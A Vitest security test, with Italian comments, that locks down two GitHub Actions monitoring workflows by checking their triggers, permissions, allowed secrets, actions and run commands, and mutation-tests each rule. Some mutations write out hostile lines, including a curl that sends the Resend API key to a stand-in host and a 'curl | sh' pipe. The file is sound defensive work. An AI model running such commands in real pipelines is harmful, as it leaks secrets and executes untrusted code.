import { describe, it, expect } from 'vitest'
import { existsSync, readFileSync } from 'node:fs'
import { join } from 'node:path'

/**
 * LOCK — il campanello e la verifica dopo il deploy non possono diventare un problema.
 *
 * ─── PERCHÉ ESISTE ─────────────────────────────────────────────────────────�
 * Roadmap di robustezza, fase 3. `campanello.yml` gira ogni 15 minuti e `dopo-deploy.yml` a ogni
 * rilascio, entrambi senza persone, con in mano la chiave Resend (che manda email a nome di
 * Kidville) e un token che apre segnalazioni. Sono in un repository PUBBLICO e il loro file lo
 * legge chiunque. Un `pull_request` in più, un permesso di scrittura sul codice o un segreto
 * stampato in un log trasformerebbero lo strumento che serve a trovare i guasti nel guasto.
 *
 * ─── COSA PRETENDE ──────────────────────────────────────────────────────────
 *  TRIGGER   campanello: SOLO `schedule` (un cron, non alle :00, a distanza di almeno 5 minuti) e
 *            `workflow_dispatch`. dopo-deploy: SOLO `deployment_status`. Mai `pull_request`, `push`,
 *            `workflow_run`: i segreti non si espongono a un evento che chiunque con un branch può
 *            provocare.
 *  PERMESSI  radice `contents: read`; per job solo `contents: read`, `issues: write` e (solo il
 *            campanello) `actions: read`. Mai `write-all`, `contents: write`, `id-token`.
 *  SEGRETI   solo `RESEND_API_KEY` e `SENTINELLA_DESTINATARI`, solo in `NOME: ${{ secrets.X }}`,
 *            documentati in `docs/cicd.md`.
 *  AZIONI    solo `actions/checkout@v4`, a checkout sparso su `scripts/campanello`; il giro di
 *            dopo-deploy fa il checkout di `main` ESPLICITAMENTE, non del commit del deployment.
 *  SCRIPT    i comandi `run:` sono un solo `node scripts/campanello/<file>.mjs`, che esiste, e non
 *            contengono nessun `${{ … }}` (il contenuto di un evento non finisce mai in una shell).
 *  VERIFICA  dopo-deploy parte solo su `state == 'success'` E ambiente `Production`.
 *  LOG       gli script non scrivono mai la chiave Resend né i destinatari in un log.
 *
 * Si tolgono i commenti PRIMA di cercare (le intestazioni spiegano proprio ciò che vietano). Le
 * PROVE GEMELLE in fondo rompono ogni regola a turno e pretendono che il lock diventi rosso.
 */

const RADICE = process.cwd()
const WORKFLOWS = join(RADICE, '.github', 'workflows')
const CICD = join(RADICE, 'docs', 'cicd.md')

const SEGRETI_AMMESSI = ['RESEND_API_KEY', 'SENTINELLA_DESTINATARI']
const TRIGGER_VIETATI = [
    'pull_request', 'pull_request_target', 'push', 'workflow_run', 'issues', 'issue_comment',
    'release', 'create', 'fork', 'watch', 'status', 'repository_dispatch', 'check_run', 'check_suite',
]

type Nome = 'campanello' | 'dopo-deploy'

function leggi(nome: Nome): string {
    return readFileSync(join(WORKFLOWS, `${nome}.yml`), 'utf8')
}

/** Toglie i commenti YAML: `#` a inizio riga o dopo uno spazio, fino a fine riga. */
function senzaCommenti(yaml: string): string {
    return yaml
        .split('\n')
        .map((riga) => riga.replace(/(^|\s)#.*$/, '$1'))
        .join('\n')
}

function trigger(codice: string): string[] {
    const righe = codice.split('\n')
    const i = righe.findIndex((r) => /^on\s*:/.test(r))
    if (i < 0) return []
    const eventi: string[] = []
    for (const r of righe.slice(i + 1)) {
        if (/^\S/.test(r)) break
        const m = /^ {2}([A-Za-z_]+)\s*:/.exec(r)
        if (m) eventi.push(m[1])
    }
    return eventi
}

/** Le chiavi `k: v` di un blocco `permissions:` (radice, indentazione `base`). */
function permessi(codice: string, base: number): { grezzo: string; chiavi: Record<string, string> }[] {
    const righe = codice.split('\n')
    const trovati: { grezzo: string; chiavi: Record<string, string> }[] = []
    const pad = ' '.repeat(base)
    for (let i = 0; i < righe.length; i++) {
        const m = new RegExp(`^${pad}permissions\\s*:\\s*(.*)$`).exec(righe[i])
        if (!m) continue
        if (m[1].trim() !== '') {
            trovati.push({ grezzo: m[1].trim(), chiavi: {} })
            continue
        }
        const chiavi: Record<string, string> = {}
        for (const r of righe.slice(i + 1)) {
            const f = new RegExp(`^${pad}  ([\\w-]+)\\s*:\\s*(\\S+)\\s*$`).exec(r)
            if (!f) break
            chiavi[f[1]] = f[2]
        }
        trovati.push({ grezzo: '', chiavi })
    }
    return trovati
}

/** I blocchi `run:` (una riga o `|`), uno per elemento. */
function comandiRun(codice: string): string[] {
    const righe = codice.split('\n')
    const out: string[] = []
    for (let i = 0; i < righe.length; i++) {
        const m = /^(\s*)(?:- )?run\s*:\s*(.*)$/.exec(righe[i])
        if (!m) continue
        const rientro = m[1].length
        if (m[2].trim() !== '' && !/^[|>][-+]?$/.test(m[2].trim())) {
            out.push(m[2].trim())
            continue
        }
        const corpo: string[] = []
        for (const r of righe.slice(i + 1)) {
            if (r.trim() !== '' && r.length - r.trimStart().length <= rientro) break
            corpo.push(r)
        }
        out.push(corpo.join('\n').trim())
    }
    return out
}

function violazioni(nome: Nome, grezzo: string, cicd: string): string[] {
    const c = senzaCommenti(grezzo)
    const v: string[] = []
    const righe = c.split('\n')

    // ── TRIGGER ──────────────────────────────────────────────────────────────
    const eventi = trigger(c)
    for (const e of eventi) if (TRIGGER_VIETATI.includes(e)) v.push(`trigger vietato: ${e}`)
    const attesi = nome === 'campanello' ? ['schedule', 'workflow_dispatch'] : ['deployment_status']
    for (const a of attesi) if (!eventi.includes(a)) v.push(`trigger mancante: ${a}`)
    for (const e of eventi) if (!attesi.includes(e) && !TRIGGER_VIETATI.includes(e)) v.push(`trigger non ammesso: ${e}`)

    if (nome === 'campanello') {
        const cron = [...c.matchAll(/^\s*-\s*cron\s*:\s*["']?([^"'\n]+?)["']?\s*$/gm)].map((m) => m[1])
        if (cron.length !== 1) v.push(`serve UN solo cron (trovati ${cron.length})`)
        for (const espr of cron) {
            const campi = espr.trim().split(/\s+/)
            if (campi.length !== 5 || campi.slice(1).some((x) => x !== '*')) {
                v.push(`forma del cron non ammessa: ${espr} (solo «minuti * * * *»)`)
                continue
            }
            const minuti = campi[0].split(',').map(Number)
            if (minuti.some((n) => !Number.isInteger(n) || n < 0 || n > 59)) v.push(`minuti del cron non validi: ${campi[0]}`)
            if (minuti.includes(0)) v.push('il cron non deve girare alle :00 (code di GitHub intasate)')
            const ordinati = [...minuti].sort((a, b) => a - b)
            const distanze = ordinati.map((m, i) => (i === 0 ? m + 60 - ordinati[ordinati.length - 1] : m - ordinati[i - 1]))
            if (ordinati.length > 1 && Math.min(...distanze) < 5) v.push('giri a meno di 5 minuti uno dall\'altro: GitHub non li rispetta e brucia minuti')
        }
    }

    // ── PERMESSI ─────────────────────────────────────────────────────────────
    const radice = permessi(c, 0)
    if (radice.length !== 1 || radice[0].grezzo !== '' || JSON.stringify(radice[0].chiavi) !== '{"contents":"read"}') {
        v.push('permessi di radice: serve esattamente `contents: read`')
    }
    const permessiJob = permessi(c, 4)
    if (permessiJob.length === 0) v.push('permessi del job assenti')
    for (const p of permessiJob) {
        if (p.grezzo !== '') v.push(`permessi del job: forma non ammessa (${p.grezzo})`)
        const ammessi: Record<string, string> = nome === 'campanello'
            ? { contents: 'read', issues: 'write', actions: 'read' }
            : { contents: 'read', issues: 'write' }
        for (const [k, val] of Object.entries(p.chiavi)) {
            if (ammessi[k] !== val) v.push(`permesso non ammesso: ${k}: ${val}`)
        }
        if (p.chiavi.contents !== 'read') v.push('il job deve avere `contents: read`')
    }

    // ── SEGRETI ──────────────────────────────────────────────────────────────
    for (const m of c.matchAll(/\$\{\{\s*secrets\.([A-Za-z0-9_]+)\s*\}\}/g)) {
        if (!SEGRETI_AMMESSI.includes(m[1])) v.push(`segreto non ammesso: ${m[1]}`)
    }
    for (const r of righe) {
        if (/\$\{\{\s*secrets\./.test(r) && !/^\s+[A-Z][A-Z0-9_]*\s*:\s*\$\{\{\s*secrets\.[A-Za-z0-9_]+\s*\}\}\s*$/.test(r)) {
            v.push(`segreto usato fuori da un'assegnazione NOME: \${{ secrets.X }}: ${r.trim()}`)
        }
    }
    for (const s of SEGRETI_AMMESSI) {
        if (!cicd.includes(s)) v.push(`${s} non documentato in docs/cicd.md`)
    }
    if (!/\bGITHUB_TOKEN\s*:\s*\$\{\{\s*github\.token\s*\}\}/.test(c)) v.push('il token deve essere `github.token` (quello del giro), non un segreto personale')

    // ── AZIONI E RUNNER ──────────────────────────────────────────────────────
    for (const m of c.matchAll(/^\s*-?\s*uses\s*:\s*(\S+)/gm)) {
        if (m[1] !== 'actions/checkout@v4') v.push(`azione non ammessa: ${m[1]}`)
    }
    for (const m of c.matchAll(/^\s*runs-on\s*:\s*(\S+)/gm)) {
        if (m[1] !== 'ubuntu-24.04') v.push(`runs-on deve essere ubuntu-24.04 (trovato ${m[1]})`)
    }
    if (!/sparse-checkout\s*:\s*scripts\/campanello\s*$/m.test(c)) v.push('il checkout deve essere sparso su scripts/campanello')
    if (nome === 'dopo-deploy' && !/^\s+ref\s*:\s*\$\{\{\s*github\.event\.repository\.default_branch\s*\}\}\s*$/m.test(c)) {
        v.push('dopo-deploy deve fare il checkout di `default_branch` ESPLICITAMENTE (non del commit del deployment)')
    }
    if (!/timeout-minutes\s*:\s*\d+/.test(c)) v.push('manca timeout-minutes')

    // ── CONCORRENZA ──────────────────────────────────────────────────────────
    if (!new RegExp(`^concurrency\\s*:\\s*\\n\\s+group\\s*:\\s*${nome}\\s*\\n\\s+cancel-in-progress\\s*:\\s*false`, 'm').test(c)) {
        v.push('concurrency: gruppo proprio e `cancel-in-progress: false`')
    }

    // ── SCRIPT ───────────────────────────────────────────────────────────────
    const run = comandiRun(c)
    if (run.length !== 1) v.push(`serve UN solo comando run (trovati ${run.length})`)
    const atteso = nome === 'campanello' ? 'node scripts/campanello/campanello.mjs' : 'node scripts/campanello/dopo-deploy.mjs'
    for (const r of run) {
        if (r !== atteso) v.push(`comando run non ammesso: ${r}`)
        if (r.includes('${{')) v.push('espressione `${{ … }}` dentro un comando run: va passata come variabile d\'ambiente')
    }
    if (/set\s+-[a-z]*x/.test(c)) v.push('set -x vietato: stampa i comandi e con loro i segreti')

    // ── DOPO-DEPLOY: SOLO PRODUZIONE E SOLO SUCCESSO ─────────────────────────
    if (nome === 'dopo-deploy') {
        if (!/deployment_status\.state\s*==\s*'success'/.test(c)) v.push("serve il filtro `state == 'success'`")
        if (!/deployment_status\.environment\s*==\s*'Production'/.test(c)) v.push("serve il filtro `environment == 'Production'`")
        if (!/SHA_ATTESO\s*:\s*\$\{\{\s*github\.event\.deployment\.sha\s*\}\}/.test(c)) v.push('SHA_ATTESO deve venire da github.event.deployment.sha')
    }

    // ── DOCUMENTAZIONE ───────────────────────────────────────────────────────
    if (!cicd.includes(`${nome}.yml`)) v.push(`${nome}.yml non documentato in docs/cicd.md`)
    return v
}

/** Gli script non devono mai scrivere in un log la chiave Resend né i destinatari. */
function scriptLoggaSegreti(sorgente: string): string[] {
    const v: string[] = []
    const senza = sorgente.replace(/\/\*[\s\S]*?\*\//g, '').split('\n').map((r) => r.replace(/(^|\s)\/\/.*$/, '$1'))
    senza.forEach((r, i) => {
        if (/(console\.\w+|\blog)\s*\(/.test(r) && /(chiaveResend|RESEND_API_KEY|destinatari|SENTINELLA_DESTINATARI|segreti\b)/.test(r)) {
            v.push(`riga ${i + 1}: un log nomina un segreto: ${r.trim()}`)
        }
    })
    return v
}

const CICD_TESTO = readFileSync(CICD, 'utf8')

describe.each<Nome>(['campanello', 'dopo-deploy'])('LOCK · %s.yml', (nome) => {
    it('il file esiste e lo script che chiama esiste', () => {
        expect(existsSync(join(WORKFLOWS, `${nome}.yml`))).toBe(true)
        expect(existsSync(join(RADICE, 'scripts', 'campanello', `${nome}.mjs`))).toBe(true)
    })

    it('rispetta tutte le regole', () => {
        expect(violazioni(nome, leggi(nome), CICD_TESTO)).toEqual([])
    })
})

describe('LOCK · gli script del campanello non scrivono segreti nei log', () => {
    for (const f of ['campanello', 'dopo-deploy', 'allarme', 'lettura', 'valuta']) {
        it(`${f}.mjs`, () => {
            const p = join(RADICE, 'scripts', 'campanello', `${f}.mjs`)
            expect(scriptLoggaSegreti(readFileSync(p, 'utf8'))).toEqual([])
        })
    }

    it('prova gemella: un log che nomina la chiave diventa rosso', () => {
        const base = readFileSync(join(RADICE, 'scripts', 'campanello', 'campanello.mjs'), 'utf8')
        const rotto = base.replace("log(`fine:", "log(`chiave ${segreti.chiaveResend} fine:")
        expect(rotto).not.toBe(base)
        expect(scriptLoggaSegreti(rotto).join(' | ')).toMatch(/un log nomina un segreto/)
    })

    it('la regione attesa dello script coincide con vercel.json', () => {
        const vj = JSON.parse(readFileSync(join(RADICE, 'vercel.json'), 'utf8')) as { regions?: string[] }
        const src = readFileSync(join(RADICE, 'scripts', 'campanello', 'valuta.mjs'), 'utf8')
        const m = /export const REGIONE_ATTESA = '([a-z0-9]+)'/.exec(src)
        expect(m, 'REGIONE_ATTESA non trovata in valuta.mjs').not.toBeNull()
        expect(vj.regions).toEqual([m![1]])
    })
})

describe('PROVE GEMELLE · il lock diventa rosso quando una regola si rompe', () => {
    type Mut = [string, Nome, (s: string) => string, RegExp]
    const MUTAZIONI: Mut[] = [
        ['campanello su pull_request', 'campanello', (s) => s.replace('on:\n  schedule:', 'on:\n  pull_request:\n  schedule:'), /trigger vietato: pull_request/],
        ['campanello su push', 'campanello', (s) => s.replace('on:\n  schedule:', 'on:\n  push:\n  schedule:'), /trigger vietato: push/],
        ['campanello su workflow_run', 'campanello', (s) => s.replace('on:\n  schedule:', 'on:\n  workflow_run:\n  schedule:'), /trigger vietato: workflow_run/],
        ['campanello senza schedule', 'campanello', (s) => s.replace(/ {2}schedule:\n(?: {4}#.*\n)* {4}- cron: "[^"]+"\n/, ''), /trigger mancante: schedule/],
        ['cron alle :00', 'campanello', (s) => s.replace('"7,22,37,52 * * * *"', '"0,15,30,45 * * * *"'), /non deve girare alle :00/],
        ['cron ogni minuto', 'campanello', (s) => s.replace('"7,22,37,52 * * * *"', '"7,8,9 * * * *"'), /meno di 5 minuti/],
        ['due cron', 'campanello', (s) => s.replace('    - cron: "7,22,37,52 * * * *"', '    - cron: "7,22,37,52 * * * *"\n    - cron: "11 * * * *"'), /UN solo cron/],
        ['cron non orario', 'campanello', (s) => s.replace('"7,22,37,52 * * * *"', '"7,22,37,52 3 * * *"'), /forma del cron non ammessa/],
        ['dopo-deploy su push', 'dopo-deploy', (s) => s.replace('on:\n  deployment_status:', 'on:\n  push:\n  deployment_status:'), /trigger vietato: push/],
        ['dopo-deploy senza deployment_status', 'dopo-deploy', (s) => s.replace('on:\n  deployment_status:', 'on:\n  workflow_dispatch:'), /trigger mancante: deployment_status/],
        ['dopo-deploy senza filtro di successo', 'dopo-deploy', (s) => s.replace("github.event.deployment_status.state == 'success'\n      && ", ''), /state == 'success'/],
        ['dopo-deploy senza filtro Production', 'dopo-deploy', (s) => s.replace("github.event.deployment_status.environment == 'Production'", "github.event.deployment_status.environment != ''"), /environment == 'Production'/],
        ['dopo-deploy che fa il checkout del commit del deployment', 'dopo-deploy', (s) => s.replace('          ref: ${{ github.event.repository.default_branch }}\n', ''), /default_branch/],
        ['sha che non viene dal deployment', 'dopo-deploy', (s) => s.replace('github.event.deployment.sha', 'github.sha'), /SHA_ATTESO/],
        ['permessi write-all', 'campanello', (s) => s.replace('permissions:\n  contents: read\n\n# Un giro', 'permissions: write-all\n\n# Un giro'), /permessi di radice/],
        ['permesso contents: write nel job', 'campanello', (s) => s.replace('    permissions:\n      contents: read\n      issues: write', '    permissions:\n      contents: write\n      issues: write'), /permesso non ammesso: contents: write/],
        ['permesso pull-requests nel job', 'campanello', (s) => s.replace('      issues: write\n      actions: read', '      issues: write\n      pull-requests: write\n      actions: read'), /permesso non ammesso: pull-requests/],
        ['permesso id-token nel job', 'dopo-deploy', (s) => s.replace('      issues: write\n    steps', '      issues: write\n      id-token: write\n    steps'), /permesso non ammesso: id-token/],
        ['azione di terzi', 'campanello', (s) => s.replace('      - name: Controlla', '      - uses: someone/random-action@main\n      - name: Controlla'), /azione non ammessa: someone/],
        ['upload-artifact', 'dopo-deploy', (s) => s.replace('      - name: Verifica il rilascio', '      - uses: actions/upload-artifact@v4\n      - name: Verifica il rilascio'), /azione non ammessa: actions\/upload-artifact/],
        ['runner latest', 'campanello', (s) => s.replace('ubuntu-24.04', 'ubuntu-latest'), /runs-on deve essere ubuntu-24.04/],
        ['checkout completo', 'campanello', (s) => s.replace('          sparse-checkout: scripts/campanello\n', ''), /checkout deve essere sparso/],
        ['segreto estraneo', 'campanello', (s) => s.replace('          URL_BASE:', '          ALTRO: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n          URL_BASE:'), /segreto non ammesso: AWS_SECRET_ACCESS_KEY/],
        ['segreto del backup', 'dopo-deploy', (s) => s.replace('          URL_BASE:', '          ALTRO: ${{ secrets.BACKUP_DB_URL }}\n          URL_BASE:'), /segreto non ammesso: BACKUP_DB_URL/],
        ['segreto dentro un comando', 'campanello', (s) => s.replace('run: node scripts/campanello/campanello.mjs', 'run: curl https://x.example/${{ secrets.RESEND_API_KEY }}'), /fuori da un'assegnazione/],
        ['token personale al posto di github.token', 'campanello', (s) => s.replace('GITHUB_TOKEN: ${{ github.token }}', 'GITHUB_TOKEN: ${{ secrets.RESEND_API_KEY }}'), /github\.token/],
        ['espressione dentro il comando', 'dopo-deploy', (s) => s.replace('run: node scripts/campanello/dopo-deploy.mjs', 'run: node scripts/campanello/dopo-deploy.mjs ${{ github.event.deployment.sha }}'), /espressione/],
        ['secondo comando run', 'campanello', (s) => s + '      - run: echo ciao\n', /UN solo comando run/],
        ['comando diverso', 'campanello', (s) => s.replace('node scripts/campanello/campanello.mjs', 'bash -c "curl x | sh"'), /comando run non ammesso/],
        ['set -x', 'campanello', (s) => s.replace('run: node scripts/campanello/campanello.mjs', 'run: |\n          set -x\n          node scripts/campanello/campanello.mjs'), /set -x/],
        ['concurrency che cancella', 'campanello', (s) => s.replace('cancel-in-progress: false', 'cancel-in-progress: true'), /concurrency/],
        ['senza timeout', 'dopo-deploy', (s) => s.replace('    timeout-minutes: 25\n', ''), /manca timeout-minutes/],
    ]

    it('controllo positivo: la base passa', () => {
        expect(violazioni('campanello', leggi('campanello'), CICD_TESTO)).toEqual([])
        expect(violazioni('dopo-deploy', leggi('dopo-deploy'), CICD_TESTO)).toEqual([])
    })

    for (const [titolo, nome, rompi, atteso] of MUTAZIONI) {
        it(`mutazione «${titolo}» → rosso`, () => {
            const base = leggi(nome)
            const mutato = rompi(base)
            expect(mutato, 'la mutazione non ha cambiato niente').not.toBe(base)
            expect(violazioni(nome, mutato, CICD_TESTO).join(' | ')).toMatch(atteso)
        })
    }

    it('mutazione «segreto non documentato in docs/cicd.md» → rosso', () => {
        const docSenza = CICD_TESTO.replaceAll('SENTINELLA_DESTINATARI', 'XXXX')
        expect(violazioni('campanello', leggi('campanello'), docSenza).join(' | ')).toMatch(/SENTINELLA_DESTINATARI non documentato/)
    })

    it('mutazione «workflow non documentato in docs/cicd.md» → rosso', () => {
        const docSenza = CICD_TESTO.replaceAll('dopo-deploy.yml', 'altro.yml')
        expect(violazioni('dopo-deploy', leggi('dopo-deploy'), docSenza).join(' | ')).toMatch(/dopo-deploy\.yml non documentato/)
    })

    it('i commenti non contano: un commento che nomina `pull_request:` e `secrets.AWS` non fa scattare niente', () => {
        const base = leggi('campanello')
        const conCommento = base.replace('on:\n', '# non usare pull_request: né ${{ secrets.AWS }} né set -x\non:\n')
        expect(violazioni('campanello', conCommento, CICD_TESTO)).toEqual([])
    })
})
